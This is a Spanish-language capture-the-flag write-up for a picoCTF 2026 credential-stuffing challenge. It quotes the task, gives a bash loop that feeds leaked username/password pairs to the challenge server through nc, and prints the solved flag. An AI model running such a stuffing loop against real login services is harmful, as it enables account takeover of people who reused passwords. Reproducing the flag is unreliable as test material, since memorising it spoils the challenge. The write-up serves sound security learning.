Credential stuffing is the automated injection of stolen username and password pairs (“credentials”) in to website login forms, in order to fraudulently gain access to user accounts.Since many users will re-use the same password and username/email, when those credentials are exposed (by a database breach or phishing attack, for example) submitting those sets of stolen credentials into dozens or hundreds of other sites can allow an attacker to compromise those accounts too. Download the credentials dump `[here](https://challenge-files.picoctf.net/c_crystal_peak/0f7df147148ac083f39bc8d66bd030d881fd5116e94e42ec0317c50a04df34d5/creds-dump.txt)`.There was a recent data breach at a famous department store, in which the login credentials of thousands of users were stolen and dumped online. You're hoping at least one person reused their credentials from the department store for an account at a local bank. Stuff those credentials and get the flag!Connect to the service with `nc crystal-peak.picoctf.net 60602`

### Solución

[](https://github.com/JorgeAlamillo/Fundamentos_de_la_Seguridad_de_la_Informacion/blob/master/picoCTF%202026/Credential%20Stuffing.md#soluci%C3%B3n)

Se automatiza la prueba de usuarios y contraseñas con los 1500 del archivo de texto

```
┌──(kali㉿kali)-[~/problemasPICO/credentialStuffing]
└─$ while IFS=';' read -r user pass; do
    echo "Probando: $user"
    # Enviamos el usuario y la contraseña al servidor, y buscamos la bandera
    echo -e "$user\n$pass" | nc crystal-peak.picoctf.net 60602 | grep "picoCTF{" && echo "¡ÉXITO! Credenciales: $user:$pass" && break
done < creds-dump.txt
```

al final nos da la bandera: picoCTF{d0nt_r3u5e_cr3d3nt1als_817212a0}

### Notas

[](https://github.com/JorgeAlamillo/Fundamentos_de_la_Seguridad_de_la_Informacion/blob/master/picoCTF%202026/Credential%20Stuffing.md#notas)

### Referencias